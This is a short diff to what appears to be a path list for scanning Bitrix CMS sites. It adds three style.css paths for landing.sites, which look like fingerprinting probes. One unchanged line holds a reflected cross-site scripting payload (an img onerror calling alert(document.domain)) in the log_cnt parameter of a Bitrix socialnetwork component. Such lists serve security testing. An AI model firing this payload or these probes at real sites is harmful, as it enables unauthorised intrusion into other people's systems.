@@ -1,1 +1,4 @@
 /bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=<img%20onerror=alert(document.domain)%20src=1>
+/bitrix/components/bitrix/landing.sites/templates/.default/style.css
+/components/bitrix/landing.sites/templates/.default/style.css
+/bx/components/bitrix/landing.sites/templates/.default/style.css
